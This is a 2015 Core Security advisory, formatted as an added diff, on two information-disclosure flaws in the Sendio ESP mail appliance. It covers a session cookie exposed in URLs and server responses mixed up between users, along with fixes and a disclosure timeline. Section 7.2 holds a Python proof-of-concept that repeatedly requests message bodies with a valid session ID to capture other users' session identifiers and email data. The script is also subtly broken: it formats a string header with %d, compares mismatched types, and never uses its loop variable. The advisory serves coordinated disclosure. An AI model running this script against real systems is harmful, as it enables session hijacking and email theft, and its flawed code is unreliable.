@@ -1,0 +1,145 @@
+1. Advisory Information
+
+Title: Sendio ESP Information Disclosure Vulnerability
+Advisory ID: CORE-2015-0010
+Advisory URL: http://www.coresecurity.com/advisories/sendio-esp-information-disclosure-vulnerability
+Date published: 2015-05-22
+Date of last update: 2015-05-22
+Vendors contacted: Sendio
+Release mode: Coordinated release
+
+
+2. Vulnerability Information
+
+Class: OWASP Top Ten 2013 Category A2 - Broken Authentication and Session Management [CWE-930], Information Exposure [CWE-200]
+Impact: Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2014-0999, CVE-2014-8391
+
+
+
+3. Vulnerability Description
+
+Sendio [1] ESP (E-mail Security Platform) is a network appliance which provides anti-spam and anti-virus solutions for enterprises. Two information disclosure issues were found affecting some versions of this software, and can lead to leakage of sensitive information such as user's session identifiers and/or user's email messages.
+
+
+4. Vulnerable Packages
+
+Sendio 6 (14.1120.0)
+Other products and versions might be affected too, but they were not tested.
+
+
+5. Vendor Information, Solutions and Workarounds
+
+Sendio informs us that [CVE-2014-0999] and [CVE-2014-8391] are fixed on Sendio software Version 7.2.4.
+
+For [CVE-2014-0999], the vulnerability only exists for HTTP web sessions and not HTTPS web sessions. Sendio recommends that customers who have not upgraded to Version 7.2.4 should disallow HTTP on their Sendio product and only use HTTPS.
+
+
+6. Credits
+
+This vulnerability was discovered and researched by Martin Gallo from Core Security's Consulting Services Team. The publication of this advisory was coordinated by Joaquín Rodríguez Varela from Core Security's Advisories Team.
+
+
+7. Technical Description / Proof of Concept Code
+
+7.1. Disclosure of session cookie in Web interface URLs
+
+The Sendio [1] ESP Web interface authenticates users with a session cookie named "jsessionid". The vulnerability [CVE-2014-0999] is caused due the way the Sendio ESP Web interface handles this authentication cookie, as the "jsessionid" cookie value is included in URLs when obtaining the content of emails. The URLs used by the application follow this format:
+
+ 
+      http://<ESP-web-interface-domain>:<ESP-web-interface-port>/sendio/ice/cmd/msg/body;jsessionid=<session-identifier-value>?id=<message-id>
+         
+This causes the application to disclose the session identifier value, allowing attackers to perform session hijacking. An attacker might perform this kind of attack by sending an email message containing links or embedded image HTML tags pointing to a controlled web site, and then accessing the victim's session cookies through the "Referrer" HTTP header. Accessing this authentication cookie might allow an attacker to hijack a victim's session and obtain access to email messages or perform actions on behalf of the victim.
+
+7.2. Response mixup in Web interface
+
+The vulnerability [CVE-2014-8391] is caused by an improper handling of users' sessions by the Web interface. Under certain conditions, this could lead to the server disclosing sensitive information that was intended for a different user. This information includes, for instance, other users' session identifiers, email message identifiers or email message subjects. In order to trigger this vulnerability, requests should be authenticated.
+
+The following Python script can be used to trigger this vulnerability under certain circumstances:
+
+ 
+import requests
+
+domain = "target.domain.com"                     # The target domain
+port = 8888                                      # The target port
+jsessionid = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # A valid jsessionid
+num = 100000                                     # No of request to make
+msgid = 9999999                                  # A valid message id to baseline the requests
+
+url = "http://%s:%d/sendio/ice/cmd/msg/body;jsessionid=%s" % (domain, port, jsessionid)
+
+
+def make_request(id):
+    params = {"id": str(id)}
+    headers = {"Cookie": "JSESSIONID=%s" % jsessionid}
+    return requests.get(url, params=params, headers=headers)
+
+
+print "[*] Reaching the target to define baseline"
+r = make_request(msgid)
+baseline_length = r.headers["content-length"]
+print "[*] Defined baseline: %d bytes" % baseline_length
+
+for id in range(0, num):
+    r = make_request(msgid)
+    rlength = int(r.headers["content-length"])
+    if r.status_code == 200 and rlength != baseline_length:
+        print "\t", r.status_code, rlength, r.text
+    else:
+        print "\t", r.status_code, rlength
+ 
+
+
+8. Report Timeline
+
+2015-03-26: Core Security sent an initial notification to Sendio informing them that multiple vulnerabilities were found in one of their products, and requested their PGP keys in order to start an encrypted communication.
+2015-03-27: Sendio replied that they would not be able to use PGP keys, but stated that their In/out SMTP gateway uses TLS, so that should suffice. They detailed that they were working on a fix for the "CS_SENDIO_JSESSIONID_DISCLOSURE" vulnerability and estimated it would be released by the end of April, 2015. They requested additional technical details for the "CS_SENDIO_INFO_LEAK" vulnerability.
+2015-03-30: Core Security informed that understood that Sendio may not be able to use PGP keys, but Core doesn't consider the use of TLS as a replacement for PGP. Core Security requested to receive confirmation from Sendio in case they wanted to keep the communications unencrypted with PGP in order to send them a draft version of the advisory.
+2015-03-30: Sendio confirmed that the communication can remain "as is" without PGP. They will inform Core once they have a specific date for publishing the fix. Sendio requested a PoC for the "CS_SENDIO_INFO_LEAK vulnerability".
+2015-03-31: Core Security sent a draft version of the advisory and PoC to Sendio.
+2015-03-31: Sendio confirmed reception of the advisory and PoC and informed Core that they would provide an update on their test on April 6.
+2015-04-06: Sendio informed Core that they were able to reproduce the "CS_SENDIO_INFO_LEAK" issue and that were still analyzing it in order to create a fix.
+2015-04-07: Core Security requested an estimated date for the release of a fix/update.
+2015-04-13: Core Security again requested an answer from Sendio regarding the release of a fix/update.
+2015-04-13: Sendio informed Core they were still working on a fix for the JSession issue that covers all use cases across Microsoft Outlook and the various supported web browsers. For the "CS_SENDIO_INFO_LEAK" they had coded a fix that was undergoing a System Test. Sendio estimated the release would take place on May 15, 2015.
+2015-04-20: Sendio informed Core they were still planning to release the fixes by May 15, 2015.
+2015-04-20: Core Security thanked Sendio for the update and informed them they would schedule their security advisory accordingly.
+2015-04-24: Core Security requested that Sendio delay the release date of the fixes until Monday, May 18 in order to avoid publishing them on a Friday.
+2015-04-27: Sendio informed Core that many of their customers have their Sendio systems set to "automatically update" on weekends. Sendio requested Core publish their advisory a week after the fix is published. Sendio also requested the ability to add some workarounds into Core's advisory.
+2015-04-28: Core Security informed Sendio that they understood their update policy and let them know that it is Core's policy to publish their advisory the same day the fix is released in order to inform the affected users of its availability. Core also stated that they were willing to add any workarounds Sendio proposed.
+2015-05-05: Sendio informed Core that they were still having problems developing a fix for the JSession vulnerability, therefore they may have to postpone the release date from May 15 to May 22.
+2015-05-07: Core Security thanked Sendio for the update and requested to be kept informed in order to have enough time to schedule their advisory.
+2015-05-12: Sendio confirmed that they needed to delay the publication of the fixes until May 21. Additionally, Sendio sent Core the proposed workarounds to be added in Core's advisory and requested a draft copy of it.
+2015-05-15: Core Security informed Sendio it would reschedule the publication of their advisory and would send them a draft copy of it once they produced the final version.
+2015-05-20: Sendio informed Core that they would publish the fixes at 10 PM, May 21.
+2015-05-20: Core Security informed Sendio that based on their publication time they would have to delay the release of the advisory until Friday 22.
+2015-05-22: Advisory CORE-2015-0010 published.
+
+
+9. References
+
+[1] http://www.sendio.com/. 
+
+
+10. About CoreLabs
+
+CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.
+
+
+11. About Core Security Technologies
+
+Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.
+
+
+12. Disclaimer
+
+The contents of this advisory are copyright (c) 2015 Core Security and (c) 2015 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+13. PGP/GPG Keys
+
+This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
